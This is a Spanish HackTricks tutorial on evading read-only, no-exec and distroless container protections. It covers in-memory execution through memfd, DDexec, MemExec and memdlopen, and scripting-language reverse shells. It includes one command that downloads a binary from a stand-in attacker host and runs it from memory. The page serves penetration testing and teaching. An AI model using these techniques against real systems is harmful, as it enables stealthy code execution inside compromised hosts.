# Evasión de protecciones FS: sistema de archivos de solo lectura / no ejecución / Distroless

<details>

<summary><strong>Aprende hacking en AWS de cero a héroe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Otras formas de apoyar a HackTricks:

* Si quieres ver a tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF**, consulta los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!
* Consigue el [**merchandising oficial de PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubre [**La Familia PEASS**](https://opensea.io/collection/the-peass-family), nuestra colección de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusivos
* **Únete al** 💬 [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **sígueme** en **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Comparte tus trucos de hacking enviando PRs a los repositorios de github de** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## Videos

En los siguientes videos puedes encontrar las técnicas mencionadas en esta página explicadas más a fondo:

* [**DEF CON 31 - Explorando la manipulación de memoria en Linux para sigilo y evasión**](https://www.youtube.com/watch?v=poHirez8jk4)
* [**Intrusiones sigilosas con DDexec-ng & dlopen() en memoria - HackTricks Track 2023**](https://www.youtube.com/watch?v=VM_gjjiARaU)

## Escenario de solo lectura / no ejecución

Es cada vez más común encontrar máquinas linux montadas con protección de sistema de archivos de **solo lectura (ro)**, especialmente en contenedores. Esto se debe a que ejecutar un contenedor con sistema de archivos ro es tan fácil como configurar **`readOnlyRootFilesystem: true`** en el `securitycontext`:

<pre class="language-yaml"><code class="lang-yaml">apiVersion: v1
kind: Pod
metadata:
name: alpine-pod
spec:
containers:
- name: alpine
image: alpine
securityContext:
<strong>      readOnlyRootFilesystem: true
</strong>    command: ["sh", "-c", "while true; do sleep 1000; done"]
</code></pre>

Sin embargo, incluso si el sistema de archivos está montado como ro, **`/dev/shm`** seguirá siendo escribible, por lo que es falso que no podamos escribir nada en el disco. Sin embargo, esta carpeta estará **montada con protección de no ejecución**, por lo que si descargas un binario aquí **no podrás ejecutarlo**.

{% hint style="warning" %}
Desde la perspectiva de un equipo rojo, esto hace que sea **complicado descargar y ejecutar** binarios que no están ya en el sistema (como puertas traseras o enumeradores como `kubectl`).
{% endhint %}

## Evasión más fácil: Scripts

Nota que mencioné binarios, puedes **ejecutar cualquier script** siempre que el intérprete esté dentro de la máquina, como un **script de shell** si `sh` está presente o un **script de python** si `python` está instalado.

Sin embargo, esto no es suficiente para ejecutar tu puerta trasera binaria u otras herramientas binarias que puedas necesitar ejecutar.

## Evasiones de memoria

Si quieres ejecutar un binario pero el sistema de archivos no lo permite, la mejor manera de hacerlo es **ejecutándolo desde la memoria**, ya que las **protecciones no se aplican allí**.

### Evasión con FD + syscall exec

Si tienes motores de script potentes dentro de la máquina, como **Python**, **Perl** o **Ruby**, podrías descargar el binario a ejecutar desde la memoria, almacenarlo en un descriptor de archivo de memoria (`create_memfd` syscall), que no va a estar protegido por esas protecciones y luego llamar a un **syscall `exec`** indicando el **fd como el archivo a ejecutar**.

Para esto puedes usar fácilmente el proyecto [**fileless-elf-exec**](https://github.com/nnsee/fileless-elf-exec). Puedes pasarle un binario y generará un script en el lenguaje indicado con el **binario comprimido y codificado en b64** con las instrucciones para **decodificarlo y descomprimirlo** en un **fd** creado llamando al syscall `create_memfd` y una llamada al syscall **exec** para ejecutarlo.

{% hint style="warning" %}
Esto no funciona en otros lenguajes de scripting como PHP o Node porque no tienen ninguna manera **predeterminada de llamar a syscalls crudos** desde un script, por lo que no es posible llamar a `create_memfd` para crear el **fd de memoria** para almacenar el binario.

Además, crear un **fd regular** con un archivo en `/dev/shm` no funcionará, ya que no se te permitirá ejecutarlo debido a que se aplicará la protección de **no ejecución**.
{% endhint %}

### DDexec / EverythingExec

[**DDexec / EverythingExec**](https://github.com/arget13/DDexec) es una técnica que te permite **modificar la memoria de tu propio proceso** sobrescribiendo su **`/proc/self/mem`**.

Por lo tanto, **controlando el código ensamblador** que está siendo ejecutado por el proceso, puedes escribir un **shellcode** y "mutar" el proceso para **ejecutar cualquier código arbitrario**.

{% hint style="success" %}
**DDexec / EverythingExec** te permitirá cargar y **ejecutar** tu propio **shellcode** o **cualquier binario** desde la **memoria**.
{% endhint %}
```bash
# Basic example
wget -O- https://attacker.com/binary.elf | base64 -w0 | bash ddexec.sh argv0 foo bar
```
Para obtener más información sobre esta técnica, consulta Github o:

{% content-ref url="ddexec.md" %}
[ddexec.md](ddexec.md)
{% endcontent-ref %}

### MemExec

[**Memexec**](https://github.com/arget13/memexec) es el siguiente paso natural de DDexec. Es un **shellcode de DDexec demonizado**, así que cada vez que quieras **ejecutar un binario diferente** no necesitas relanzar DDexec, puedes simplemente ejecutar el shellcode de memexec a través de la técnica DDexec y luego **comunicarte con este demonio para pasar nuevos binarios para cargar y ejecutar**.

Puedes encontrar un ejemplo de cómo usar **memexec para ejecutar binarios desde un reverse shell de PHP** en [https://github.com/arget13/memexec/blob/main/a.php](https://github.com/arget13/memexec/blob/main/a.php).

### Memdlopen

Con un propósito similar al de DDexec, la técnica [**memdlopen**](https://github.com/arget13/memdlopen) permite una **forma más fácil de cargar binarios** en memoria para luego ejecutarlos. Incluso podría permitir cargar binarios con dependencias.

## Bypass de Distroless

### Qué es distroless

Los contenedores distroless contienen solo los **componentes mínimos necesarios para ejecutar una aplicación o servicio específico**, como bibliotecas y dependencias de tiempo de ejecución, pero excluyen componentes más grandes como un gestor de paquetes, shell o utilidades del sistema.

El objetivo de los contenedores distroless es **reducir la superficie de ataque de los contenedores eliminando componentes innecesarios** y minimizando el número de vulnerabilidades que pueden ser explotadas.

### Reverse Shell

En un contenedor distroless podrías **ni siquiera encontrar `sh` o `bash`** para obtener una shell regular. Tampoco encontrarás binarios como `ls`, `whoami`, `id`... todo lo que normalmente ejecutas en un sistema.

{% hint style="warning" %}
Por lo tanto, **no** podrás obtener un **reverse shell** o **enumerar** el sistema como lo haces normalmente.
{% endhint %}

Sin embargo, si el contenedor comprometido está ejecutando, por ejemplo, una web flask, entonces python está instalado, y por lo tanto puedes obtener un **reverse shell de Python**. Si está ejecutando node, puedes obtener un rev shell de Node, y lo mismo con casi cualquier **lenguaje de scripting**.

{% hint style="success" %}
Usando el lenguaje de scripting podrías **enumerar el sistema** utilizando las capacidades del lenguaje.
{% endhint %}

Si no hay protecciones de **solo lectura/sin ejecución**, podrías abusar de tu reverse shell para **escribir en el sistema de archivos tus binarios** y **ejecutarlos**.

{% hint style="success" %}
Sin embargo, en este tipo de contenedores estas protecciones normalmente existirán, pero podrías usar las **técnicas de ejecución en memoria anteriores para eludirlas**.
{% endhint %}

Puedes encontrar **ejemplos** de cómo **explotar algunas vulnerabilidades de RCE** para obtener **reverse shells** de lenguajes de scripting y ejecutar binarios desde la memoria en [**https://github.com/carlospolop/DistrolessRCE**](https://github.com/carlospolop/DistrolessRCE).

<details>

<summary><strong>Aprende hacking en AWS de cero a héroe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Otras formas de apoyar a HackTricks:

* Si quieres ver a tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF**, consulta los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!
* Consigue el [**merchandising oficial de PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubre [**La Familia PEASS**](https://opensea.io/collection/the-peass-family), nuestra colección de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusivos
* **Únete al** 💬 [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **sigue** a **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Comparte tus trucos de hacking enviando PRs a los repositorios de Github** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
